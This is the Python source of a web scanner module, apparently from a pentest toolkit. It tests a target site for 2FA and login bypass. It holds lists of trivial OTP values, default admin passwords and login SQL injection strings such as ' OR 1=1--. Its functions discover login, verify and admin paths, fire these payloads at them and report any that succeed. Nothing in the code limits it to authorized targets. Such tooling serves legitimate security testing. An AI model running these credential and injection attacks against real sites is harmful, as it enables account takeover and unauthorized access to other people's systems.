"""
cyberm4fia-scanner - 2FA Bypass & Authentication Bypass Scanner
Detects: 2FA bypass, default credentials, auth token leaks,
login SQL injection, and session persistence flaws.
Based on Az0x7/vulnerability-Checklist 2FA bypass and authentication checklists.
"""

from urllib.parse import urlparse

from utils.colors import log_info, log_success, log_warning
from utils.request import smart_request, ScanExceptions

# ─────────────────────────────────────────────────────
# 2FA Bypass Payloads
# ─────────────────────────────────────────────────────
OTP_BYPASS_VALUES = [
    "",            # Empty OTP
    "000000",      # All zeros
    "111111",      # All ones
    "123456",      # Sequential
    "null",        # Null string
    "0",           # Single zero
    "true",        # Boolean
    "[]",          # Empty array
    "0000",        # Short OTP
    "99999999",    # Overflow
]

# Status code manipulation — check if app trusts client-side validation
RESPONSE_MANIPULATION_INDICATORS = [
    '"success":false', '"success": false',
    '"valid":false', '"valid": false',
    '"verified":false', '"status":"failed"',
    '"error":true', '"authenticated":false',
]

# ─────────────────────────────────────────────────────
# Default Credentials
# ─────────────────────────────────────────────────────
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("admin", "P@ssw0rd"), ("root", "root"),
    ("root", "toor"), ("administrator", "administrator"),
    ("admin", "changeme"), ("test", "test"), ("admin", "1234"),
    ("admin", "admin1234"), ("guest", "guest"), ("user", "user"),
    ("demo", "demo"), ("admin", ""), ("root", ""),
]

# ─────────────────────────────────────────────────────
# Login SQLi Payloads
# ─────────────────────────────────────────────────────
LOGIN_SQLI_PAYLOADS = [
    ("admin' OR '1'='1", "password"),
    ("admin'--", "password"),
    ("' OR 1=1--", "password"),
    ("' OR '1'='1'--", "anything"),
    ("admin' #", "password"),
    ("' UNION SELECT 1,2,3--", "password"),
    ("admin'/*", "password"),
]

# ─────────────────────────────────────────────────────
# Common 2FA / Verify Endpoints
# ─────────────────────────────────────────────────────
VERIFY_PATHS = [
    "/verify", "/verify-otp", "/2fa", "/2fa/verify",
    "/api/v1/verify", "/api/auth/verify", "/mfa/verify",
    "/otp/verify", "/auth/verify-code",
]

LOGIN_PATHS = [
    "/login", "/signin", "/sign-in", "/api/v1/login",
    "/api/auth/login", "/admin/login", "/wp-login.php",
    "/user/login",
]

ADMIN_PATHS = [
    "/admin", "/admin/", "/administrator", "/dashboard",
    "/panel", "/manage", "/wp-admin", "/admin.php",
    "/backend", "/control", "/cpanel",
]


def _find_endpoints(url, paths, delay=0):
    """Find which endpoints exist on target."""
    found = []
    parsed = urlparse(url)
    for path in paths:
        try:
            test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
            resp = smart_request("get", test_url, delay=delay, timeout=5)
            if resp.status_code in (200, 301, 302, 405):
                found.append(test_url)
        except ScanExceptions:
            pass
    return found


def _test_2fa_bypass_direct_access(url, verify_urls, delay=0):
    """Test if authenticated pages are accessible after bypassing 2FA step."""
    findings = []
    parsed = urlparse(url)

    # Try accessing dashboard/admin directly without completing 2FA
    protected_paths = [
        "/dashboard", "/profile", "/account", "/home",
        "/api/v1/user", "/settings",
    ]

    for path in protected_paths:
        try:
            test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
            resp = smart_request("get", test_url, delay=delay, timeout=5)
            if resp.status_code == 200:
                body = resp.text.lower()
                # Check if it's a real page (not login redirect)
                if "login" not in body and "sign in" not in body and len(resp.text) > 500:
                    findings.append({
                        "type": "2FA Bypass",
                        "vuln": "Direct Page Access",
                        "payload": path,
                        "severity": "CRITICAL",
                        "description": f"Protected page accessible without 2FA: {path}",
                        "url": test_url,
                    })
                    log_success(f"🔓 2FA bypass! Direct access to {path}")
                    return findings
        except ScanExceptions:
            pass
    return findings


def _test_2fa_bypass_otp(verify_urls, delay=0):
    """Test 2FA bypass with null/empty/trivial OTP values."""
    findings = []

    for verify_url in verify_urls:
        for otp_value in OTP_BYPASS_VALUES:
            try:
                # Try as form data
                resp = smart_request(
                    "post", verify_url,
                    data={"otp": otp_value, "code": otp_value, "token": otp_value},
                    delay=delay, timeout=5,
                )
                if resp.status_code in (200, 302):
                    body = resp.text.lower()
                    # Check for success indicators
                    success = any(kw in body for kw in [
                        "dashboard", "welcome", "success", "verified",
                        "profile", "account",
                    ])
                    if success:
                        findings.append({
                            "type": "2FA Bypass",
                            "vuln": "OTP Bypass",
                            "payload": otp_value if otp_value else "(empty)",
                            "severity": "CRITICAL",
                            "description": f"2FA bypassed with OTP={otp_value or '(empty)'}",
                            "url": verify_url,
                        })
                        log_success(f"🔓 2FA OTP bypass! Value: {otp_value or '(empty)'}")
                        return findings

                # Try as JSON
                resp = smart_request(
                    "post", verify_url,
                    json={"otp": otp_value, "code": otp_value},
                    headers={"Content-Type": "application/json"},
                    delay=delay, timeout=5,
                )
                if resp.status_code in (200, 302):
                    body = resp.text.lower()
                    success = any(kw in body for kw in [
                        "dashboard", "welcome", "success", "verified",
                    ])
                    if success:
                        findings.append({
                            "type": "2FA Bypass",
                            "vuln": "OTP Bypass (JSON)",
                            "payload": otp_value if otp_value else "(empty)",
                            "severity": "CRITICAL",
                            "description": f"2FA bypassed via JSON OTP={otp_value or '(empty)'}",
                            "url": verify_url,
                        })
                        log_success(f"🔓 2FA bypass (JSON)! Value: {otp_value or '(empty)'}")
                        return findings
            except ScanExceptions:
                pass
    return findings


def _test_response_manipulation_hints(verify_urls, delay=0):
    """Check if 2FA response contains manipulable success/failure indicators."""
    findings = []

    for verify_url in verify_urls:
        try:
            resp = smart_request(
                "post", verify_url,
                data={"otp": "999999"},
                delay=delay, timeout=5,
            )
            body = resp.text
            for indicator in RESPONSE_MANIPULATION_INDICATORS:
                if indicator in body:
                    findings.append({
                        "type": "2FA Bypass",
                        "vuln": "Response Manipulation Hint",
                        "payload": indicator,
                        "severity": "MEDIUM",
                        "description": f"Response contains manipulable indicator: {indicator}",
                        "url": verify_url,
                    })
                    log_warning(f"⚠️ Response manipulation hint: {indicator}")
                    break
        except ScanExceptions:
            pass
    return findings


def _test_default_credentials(login_urls, delay=0):
    """Test for default/weak credentials on login pages."""
    findings = []

    for login_url in login_urls:
        for username, password in DEFAULT_CREDS:
            try:
                # Try form POST
                resp = smart_request(
                    "post", login_url,
                    data={"username": username, "password": password,
                          "user": username, "pass": password},
                    delay=delay, timeout=5,
                )
                if resp.status_code in (200, 302):
                    body = resp.text.lower()
                    success = any(kw in body for kw in [
                        "dashboard", "welcome", "logout", "profile",
                        "admin panel", "settings",
                    ])
                    redirect_success = (
                        resp.status_code == 302 and
                        "login" not in resp.headers.get("location", "").lower()
                    )
                    if success or redirect_success:
                        findings.append({
                            "type": "Authentication Bypass",
                            "vuln": "Default Credentials",
                            "payload": f"{username}:{password}",
                            "severity": "CRITICAL",
                            "description": f"Login with default creds: {username}:{password}",
                            "url": login_url,
                        })
                        log_success(f"🔑 Default creds! {username}:{password}")
                        return findings
            except ScanExceptions:
                pass
    return findings


def _test_login_sqli(login_urls, delay=0):
    """Test for SQL injection in login forms."""
    findings = []

    for login_url in login_urls:
        # Get baseline for failed login
        try:
            baseline = smart_request(
                "post", login_url,
                data={"username": "cybm4fia_test_user", "password": "cybm4fia_test_pass"},
                delay=delay, timeout=5,
            )
            baseline_len = len(baseline.text)
        except ScanExceptions:
            continue

        for sqli_user, sqli_pass in LOGIN_SQLI_PAYLOADS:
            try:
                resp = smart_request(
                    "post", login_url,
                    data={"username": sqli_user, "password": sqli_pass,
                          "user": sqli_user, "pass": sqli_pass},
                    delay=delay, timeout=5,
                )
                # SQLi success: different response or redirect
                if resp.status_code == 302 and "login" not in resp.headers.get("location", "").lower():
                    findings.append({
                        "type": "Authentication Bypass",
                        "vuln": "Login SQL Injection",
                        "payload": sqli_user,
                        "severity": "CRITICAL",
                        "description": f"Login SQLi: {sqli_user}",
                        "url": login_url,
                    })
                    log_success(f"💉 Login SQLi! {sqli_user}")
                    return findings
                elif resp.status_code == 200:
                    body = resp.text.lower()
                    success = any(kw in body for kw in [
                        "dashboard", "welcome", "logout", "profile",
                    ])
                    if success and abs(len(resp.text) - baseline_len) > 200:
                        findings.append({
                            "type": "Authentication Bypass",
                            "vuln": "Login SQL Injection",
                            "payload": sqli_user,
                            "severity": "CRITICAL",
                            "description": f"Login SQLi: {sqli_user}",
                            "url": login_url,
                        })
                        log_success(f"💉 Login SQLi! {sqli_user}")
                        return findings
            except ScanExceptions:
                pass
    return findings


def _test_token_in_url(url, delay=0):
    """Check if auth tokens appear in URLs (referrer leakage risk)."""
    findings = []
    try:
        resp = smart_request("get", url, delay=delay, timeout=10)
        body = resp.text

        # Check for tokens in URLs within HTML
        import re
        token_patterns = [
            r'[?&](token|access_token|api_key|secret|auth)=([a-zA-Z0-9_\-\.]{16,})',
            r'[?&](session_id|sid|jwt)=([a-zA-Z0-9_\-\.]{16,})',
        ]
        for pattern in token_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                for param_name, token_value in matches[:3]:
                    findings.append({
                        "type": "Authentication Bypass",
                        "vuln": "Token in URL",
                        "payload": f"{param_name}={token_value[:16]}...",
                        "severity": "MEDIUM",
                        "description": f"Auth token leaked in URL: {param_name}",
                        "url": url,
                    })
                    log_warning(f"⚠️ Token in URL: {param_name}")
                break
    except ScanExceptions:
        pass
    return findings


def scan_auth_bypass(url, delay=0):
    """
    Main 2FA Bypass & Authentication Bypass scanner entry point.
    Tests 2FA bypass, default creds, login SQLi, token leaks,
    and response manipulation.
    """
    log_info("Starting 2FA & Authentication Bypass Scanner...")
    all_findings = []

    # Discover endpoints
    log_info("  → Discovering verify/login/admin endpoints...")
    verify_urls = _find_endpoints(url, VERIFY_PATHS, delay)
    login_urls = _find_endpoints(url, LOGIN_PATHS, delay)
    admin_urls = _find_endpoints(url, ADMIN_PATHS, delay)

    log_info(f"  Found: {len(verify_urls)} verify, {len(login_urls)} login, {len(admin_urls)} admin")

    # 2FA Bypass
    if verify_urls:
        log_info("  → Testing 2FA OTP bypass...")
        all_findings.extend(_test_2fa_bypass_otp(verify_urls, delay))
        log_info("  → Testing response manipulation hints...")
        all_findings.extend(_test_response_manipulation_hints(verify_urls, delay))

    # Direct access bypass (skip 2FA)
    log_info("  → Testing direct page access (2FA skip)...")
    all_findings.extend(_test_2fa_bypass_direct_access(url, verify_urls, delay))

    # Default Credentials
    if login_urls:
        log_info("  → Testing default credentials...")
        all_findings.extend(_test_default_credentials(login_urls, delay))
        log_info("  → Testing login SQL injection...")
        all_findings.extend(_test_login_sqli(login_urls, delay))

    # Token Leakage
    log_info("  → Checking for token leakage in URLs...")
    all_findings.extend(_test_token_in_url(url, delay))

    if not all_findings:
        log_info("No authentication bypass vectors detected.")

    log_success(f"Auth bypass scan complete. {len(all_findings)} finding(s).")
    return all_findings
